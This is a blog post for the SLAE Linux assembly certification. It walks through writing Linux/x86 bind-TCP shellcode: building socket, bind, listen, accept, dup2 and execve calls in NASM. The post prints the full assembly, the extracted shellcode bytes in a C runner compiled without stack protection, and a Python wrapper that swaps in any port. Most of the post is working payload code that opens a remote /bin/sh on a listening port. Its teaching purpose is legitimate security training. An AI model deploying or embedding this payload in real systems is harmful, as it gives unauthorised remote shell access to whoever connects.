---
layout: post
title: "SLAE Assignment 1 - Shell Bind TCP (Linux/x86)"
---

>  The **SecurityTube Linux Assembly Expert (SLAE)** aims to teach the basics
>  of assembly language on the Linux platform from a security perspective and
>  its application to writing shellcode, encoders, decoders and crypters, among
> other things.

The exam style of [SecurityTube Linux Assembly Expert (SLAE)](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
is bit different. You have to complete 7 assignments of varying difficulty and post
it on your blog. Also, store the source code and all other helper scripts that
you have used in your GitHub account.

<!-- more -->
### Assignment \#1: Shell Bind TCP Shellcode (Linux/x86)

The following are the criteria:

-   Binds to a port

-   Execs Shell on incoming connection

-   Port number should be easily configurable


I will be writing a python wrapper which takes in a port number and spits out the entire shellcode which binds shell to given port. So, here is how we are going to do this:

1.  Create a socket with SYS_SOCKET

2.  Bind the socket to an address/port using SYS_BIND

3.  Listen for incoming connections using SYS_LISTEN

4.  Accept connection using SYS_ACCEPT

5.  Redirect stdin, stdout, stderr with SYS_DUP2

6.  Exec /bin/sh with SYS_EXECVE


Before we start, we need to know how we can issue calls to SYS_SOCKET, SYS_BIND etc. For this we can use SYS_SOCKETCALL. The below information is from the linux man page.

```
int socketcall(int call, unsigned long *args);
//socketcall - socket system calls
//call determines which socket function to invoke
//args points to a block containing the actual arguments, which are passed through to the appropriate call.
```


The system call number for sys_socketcall is specified in the below header file.

```
/usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_socketcall     102
```


### Creating a socket with SYS_SOCKET

To create a socket we need to call sys_socket via sys_socketcall.

```
int socket(int domain, int type, int protocol); 
    ; [/usr/include/linux/net.h] 
    ; [#define SYS_SOCKET 1] [sys_socket(2)]
```

The parameters for sys_socket call are as follows:

```
domain  = AF_INET   
        ; [/usr/include/i386-linux-gnu/bits/socket.h] 
        ; [#define AF_INET PF_INET]
        ; [#define PF_INET 2]
        ; [IP protocol family]   

type    = SOCK_STREAM   
        ; [/usr/include/i386-linux-gnu/bits/socket.h]
        ; [SOCK_STREAM = 1]
        ; [Sequenced, reliable, connection-based byte streams]

protocol= IP_PROTO  
        ; [/usr/include/linux/in.h] 
        ; [IPPROTO_IP = 0]
        ; [Dummy protocol for TCP]
```

So, the call to sys_socket will be like this:

```nasm
sockfd = sys_socket(2, 1, 0)
```

Once the call is completed successfully, the socket file descriptor will be saved in EAX. Converting this into assembly:

```nasm
        ; EAX = 0x66 = 102      ; sys_socketcall()
        ; EBX = 0x1             ; sys_socket()
        ; ECX = Pointer to sys_socket arguments

        xor eax, eax
        push eax                ; Argument 3 for socket() =>    IPPROTO_IP = 0
        mov al, 0x66
        
        push byte 0x1               
        pop ebx                 ; clear EBX and store 0x1 in EBX
        push byte 0x1           ; Argument 2 for socket() =>    SOCK_STREAM = 1
        push byte 0x2           ; Argument 1 for socket() =>    AF_INET = 2 
        
        ; Now we have arguments for sys_socket() in the stack. ESP points to them.
        
        mov ecx, esp			; Pointer to sys_socket args
        int 0x80                ; returns socket file descriptor to EAX
```

### Binding the socket to address/port with SYS_BIND

Now that we have created a socket, we need to bind it with address/port. We can use SYS_BIND for this purpose. The system call number for SYS_BIND is defined in the below header file.
```
[/usr/include/linux/net.h]
[#define SYS_BIND 2] [sys_bind(2)]
```

The man page entry for Bind is as follows:
```
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);	
```

Bind takes three arguments and among them ```struct sockaddr *addr``` is  the one that we need to pay more attention. The definition for ```sockaddr``` can be found in ```[/usr/include/linux/in.h]``` header file.
```
/* Structure describing an Internet (IP) socket address. */
#define __SOCK_SIZE__	16		/* sizeof(struct sockaddr)	*/
struct sockaddr_in {
	  __kernel_sa_family_t	sin_family;		/* Address family		*/
	  __be16		sin_port;		/* Port number			*/
		struct in_addr	sin_addr;		/* Internet address		*/

		/* Pad to size of `struct sockaddr'. */
		unsigned char		__pad[__SOCK_SIZE__ - sizeof(short int) -
							sizeof(unsigned short int) - sizeof(struct in_addr)];
		};
```

We will define this structure first as we require a pointer to it. Lets look at the different members of the structure.
```
sin_family = 2		; AF_INET
```
The port number should be converted to network endian. We can use python for that. I am using port 4321 for my bind shell.
```
$ python -c 'import socket as s;port = s.htons(4321);print "port 4321 => ",port,hex(port)'
port 4321 =>  57616 0xe110
```
The network endian equivalent of port 4321 is 57616 and corresponding hex value 0xe110.
```
sin_port = 0xe110
```

The next one ```sin_addr``` our desired value is defined in ```/usr/include/linux/in.h```.
```
#define INADDR_ANY ((unsigned long int) 0x00000000) ;
/* Address to accept any incoming messages. */

sin_addr = 0
```
With the above information, our call to bind should be like this.
```
bind(sockfd, *ptr->[2, 57616, 0], 16)
```
So the assembly code becomes:
```nasm
		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x2  = sys_bind()
		; ECX = pointer to arguments of sys_bind

		; EAX has the socketfd, we need to save it somewhere for later use.

		pop ebx				; EBX = 2
		pop esi				; Clears ESI, also the stack now has our required value for sin_addr = 0
		xchg esi, eax			; sockfd is now in esi
		
		mov al, 0x66			; sys_socketcall()
		push word 0xe110		; push sin_port = hex(htons(4321))
		push word bx			; push sin_family = AF_INET = 2
		
		; now stack has (from top) -> [2, 0xe110, 0]
		; ESP points to this structure
		; save it in ECX
		
		mov ecx, esp
		
		push 0x10				; addrlen = 16
		push ecx				; pointer to sockaddr
		push esi				; sockfd

		mov ecx, esp			; Pointer to bind args

		int 0x80
```

### Listen for incoming connections using SYS_LISTEN
At this moment we have a socket bound to a port and we want to listen that port with SYS_LISTEN. The man page entry for listen is as follows:
```
int listen(int sockfd, int backlog);
// backlog = size of the connection queue
```
The system call number for ```sys_listen``` is defined in ```/usr/include/linux/net.h``` header file.
```
#define SYS_LISTEN 4 	/* sys_listen(2)*/
```
With this information lets write this into assembly.
```nasm
		; EAX = 0x66 				; sys_socketcall()
		; EBX = 0x4				; sys_listen()
		; ECX = pointer to args of sys_listen

		mov al, 0x66				; sys_socketcall()
		mov bl, 0x4				; sys_listen()
		
		xor edi, edi
		push edi				; backlog = 0
		
		push esi				; ESI still has our socketfd
		mov ecx, esp

		int 0x80
```
### Accept connection using SYS_ACCEPT
The port 4321 must be open on our system after sys_listen, now we need to accept the incoming connection using SYS_ACCEPT. The man page entry for accept is as follows:
```
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
The system call number for ```sys_accept``` is defined in ```/usr/include/linux/net.h``` header file as:
```
#define SYS_ACCEPT 5 	/* sys_accept(2)*/
```
When accepting a new connection we do not want any information regarding the client. So, referring to the man page:

> When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.

So the call to sys_accept() goes like this:
```
sys_accept(sockfd, 0, 0)
```
The assembly code becomes:
```nasm
		; EAX = 0x66			; sys_socketcall()
		; EBX = 0x5			; sys_accept()
		; ECX = Pointer to args of sys_accept()

		mov al, 0x66			; sys_socketcall()
		inc ebx				; EBX is 4, so just add 1 to it = 5;  sys_accept()
		
		push edi			; addrlen = EDI = 0
		push edi			; addr	  = EDI = 0
		push esi			; ESI has our sockfd
		mov ecx, esp
		
		int 0x80
```
### Redirect stdin, stdout, stderr with SYS_DUP2
Now that we are connected to the client, we need to redirect ```stdin, stdout, stderr``` to the client socket file descriptor.
```
stdin 	= 0
stdout 	= 1
stderr 	= 2
```
The man page entry for ```dup2``` is as follows:
```
int dup2(int oldfd, int newfd);
```
The ```oldfd``` is our client socket file descriptor and newfd is ```stdin, stdout, stderr```. So, we need to call dup2 as follows:
```
dup2(clientfd, 0)
dup2(clientfd, 1)
dup2(clientfd, 2)
```
As of now, register EAX has the client socket file descriptor. It should be moved to EBX. The system call number for ```sys_dup2``` is ```0x3f``` and this value should be moved in to EAX for each ```dup2``` call. The assembly code becomes:
```nasm
		
        ;EXA 	= 0x3f
        ;EBX	= oldfd	= clientfd
        ;ECX	= newfd	= 0, 1, 2

		xchg ebx,eax				; save the clientfd in ebx
		
        	xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f			; sys_dup2()
			int 0x80
			dec ecx				; 2, 1, 0
			jns dup_loop			; loop until SF is set
```

### Exec /bin/sh with SYS_EXECVE
Finally, we need to execute a ```/bin/sh```shell with ```sys_execve``` system call. The man page entry for ```execve()``` is as follows:
```
int execve(const char *filename, char *const argv[], char *const envp[]);
```
The assembly code is as follows:
```nasm
		
        ; EAX	= 0xb		; sys_execve()
        ; EBX	= pointer to /bin/sh null terminated
        ; ECX	= pointer to address of /bin/sh null terminated
		; EDX	= pointer to an empty array
		
		xor eax, eax
		push eax				; push first 4 null bytes onto stack
			

		; //bin/sh (8)
		push 0x68732f2f
		push 0x6e69622f
							; stack contents from top - //bin/sh 0x00000000
		mov ebx, esp				; EBX has address of //bin/sh null terminated

		push eax				; push another 4 null bytes
        						; stack contents from top - 0x00000000 //bin/sh 0x00000000
        
		mov edx, esp				; now EDX has the address of the 4 null bytes that we just pushed
        
		push ebx				; stack contents from top
        						; addr_of_/bin/sh 0x00000000 //bin/sh 0x00000000

		mov ecx, esp

		mov al, 0xb
		int 0x80
```
### Complete Shellcode
```nasm
;
; Author 		: Rizal Muhammed (UB3RSiCK)
; Description		: SLAE x86 Assignment 1 - Shell Bind TCP Shellcode (Linux/x86)
; File 			: shell-bind-tcp-x86.nasm
; Website		: https://ub3rsick.github.io/

global _start

section .text

	_start:
		; int socketcall(int call, unsigned long *args)
		; int socket(int domain, int type, int protocol); 
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			; Argument 3 for socket() =>  	IPPROTO_IP = 0
		mov al, 0x66
		
		push byte 0x1			; Argument 2 for socket() => 	SOCK_STREAM = 1	
		pop ebx
		push byte 0x1
		
		push byte 0x2			; Argument 1 for socket() => 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			; returns socket file descriptor to EAX

		;********************************************************************************;

		; Binding socket to port.		
		; Now that we have a socket, we need to bind it to a port.
		;	
		; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);	

		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x2  = sys_bind()
		; ECX = pointer to arguments of sys_bind

		; EAX has the socketfd, we need to save it somewhere for later use.

		pop ebx			; EBX = 2
		pop esi			; Clears ESI also the stack now has our required value for sin_addr = 0

			; sin_addr = 0; will now be on stack from earlier push
			;#define INADDR_ANY ((unsigned long int) 0x00000000) ;
		
		xchg esi, eax			; sockfd is now in esi
		
		mov al, 0x66
		push word 0xe110		; push sin_port = hex(htons(4321))
		push word bx			; push sin_family = AF_INET = 2
		
		; now stack has (from top) -> [2, 0xe110, 0]
		; ESP points to this structure
		; save it in ECX
		
		mov ecx, esp
		
		push 0x10			; addrlen = 16
		push ecx			; pointer to sockaddr
		push esi			; sockfd

		mov ecx, esp			; Pointer to bind args

		int 0x80
		
		;********************************************************************************;

		; listen to the port
		; int listen(int sockfd, int backlog);

		; EAX = 0x66 	; sys_socketcall()
		; EBX = 0x4	; sys_listen()
		; ECX = pointer to args of sys_listen

		mov al, 0x66
		mov bl, 0x4
		
		xor edi, edi
		push edi		; backlog = 0
		
		push esi		; ESI still has our socketfd
		mov ecx, esp

		int 0x80

		;********************************************************************************;
		; Accept connections with sys_accept
		
		; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
		; we dont want any information regarding the client. So, from the man page of accept : 
		; When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
		
		; EAX = 0x66		; sys_socketcall()
		; EBX = 0x5		; sys_accept()
		; ECX = Pointer to args of sys_accept()


		mov al, 0x66
		inc ebx
		
		push edi		; addrlen = EDI = 0
		push edi		; addr	  = EDI = 0
		push esi		; ESI has our sockfd
		mov ecx, esp
		
		int 0x80

	
		;********************************************************************************;
		; Redirect srdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		;EAX 	= 0x3f
	        ;EBX	= oldfd	= clientfd
       		;ECX	= newfd	= 0, 1, 2

		xchg ebx,eax		; save the clientfd in ebx
		
	        xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f		; sys_dup2()
			int 0x80
			dec ecx			; 2, 1, 0
			jns dup_loop		; loop until SF is set

		;********************************************************************************;
		; execve /bin/sh
		
		; EAX	= 0xb		; sys_execve()
	    	; EBX	= pointer to /bin/sh null terminated
      		; ECX	= pointer to address of /bin/sh null terminated
		; EDX	= pointer to an empty array
		
		xor eax, eax
		push eax				; push first 4 null bytes onto stack
			

		; //bin/sh (8)
		push 0x68732f2f
		push 0x6e69622f
							; stack contents from top - //bin/sh 0x00000000
		mov ebx, esp				; EBX has address of //bin/sh null terminated

		push eax				; push another 4 null bytes
        						; stack contents from top - 0x00000000 //bin/sh 0x00000000
        
		mov edx, esp				; now EDX has the address of the 4 null bytes that we just pushed
        
		push ebx				; stack contents from top
        						; addr_of_/bin/sh 0x00000000 //bin/sh 0x00000000

		mov ecx, esp

		mov al, 0xb
		int 0x80
```
Compiling and linking assembly code.
```
nasm -f elf32 shell-bind-tcp-x86.nasm -o shell-bind-tcp-x86.o
ld shell-bind-tcp-x86.o -o shell-bind-tcp-x86
```
Dumping shellcode from the executable.
```
objdump -d ./shell-bind-tcp-x86|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

![Assemble, Link and Dump Shellcode](/assets/asn-1-asbmle-link-dump-shellcode.PNG)

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x96\xb0\x66\x66\x68\x10\xe1\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xff\x57\x56\x89\xe1\xcd\x80\xb0\x66\x43\x57\x57\x56\x89\xe1\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}

```
Compiling with gcc.
```
gcc shellcode.c -o shell-bind-tcp -fno-stack-protector -z execstack
```
![Compile and Run](/assets/asn-1-compile-and-run.PNG)

### Configuring Port
Below is the python wrapper that takes in port number as argument and spits out the entire shellcode.
```python
#!/usr/bin/env python

'''
Author 	: RIZAL MUHAMMED (UB3RSiCK)
Desc	: port-config-shell-bind-tcp.py
'''

import socket
import sys

if len(sys.argv) != 2:
	print "Usage: {} Port".format(sys.argv[0])
	sys.exit()

port = int(sys.argv[1])

# Check if user has passed invalid port number
if port < 1000 or port > 65535 :
	print "Either port number less than 1000: user needs to be root"
	print "Or"
	print "Port number greater than 65535"
	sys.exit()

hex_port = hex(port)[2:]

if len(hex_port) < 4:
	# for all port number > 1000, len(hex(port)) will be 3 or more, not less than that
	hex_port = "0" + hex_port

h1 = hex_port[:2]
h2 = hex_port[2:]

if h1 == "00" or h2 == "00":
	print "port number contain null byte, please choose different port number"
	sys.exit()


port_no = '\\x'+h1+'\\x'+h2

print 'Port: {0} , Hex = {1}, inShellcode = {2}'.format(port, hex_port, port_no)

shellcode = (
	"\\x31\\xc0\\x50\\xb0\\x66\\x6a\\x01\\x5b\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5b\\x5e\\x96\\xb0\\x66\\x66\\x68"+
	port_no+	# this is the place where we need to place our port number
	"\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x31\\xff\\x57\\x56\\x89\\xe1\\xcd"+
	"\\x80\\xb0\\x66\\x43\\x57\\x57\\x56\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc0\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49"+
	"\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"+
	"\\xb0\\x0b\\xcd\\x80")

print '"'+shellcode+'"'
```
Running the python wrapper script.

![Port Config Python Wrapper](/assets/asn-1-port-python-wrapper-out.PNG)

Insert the shellcode in the template file and compile.

![Run Custom Port Shellcode](/assets/asn-1-port-config-shellcode-run.PNG)

And we are done :)


This blog post has been created for completing the requirements of the [SLAE (Linux/x86)](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) certification.

Student ID: **SLAE - 933**
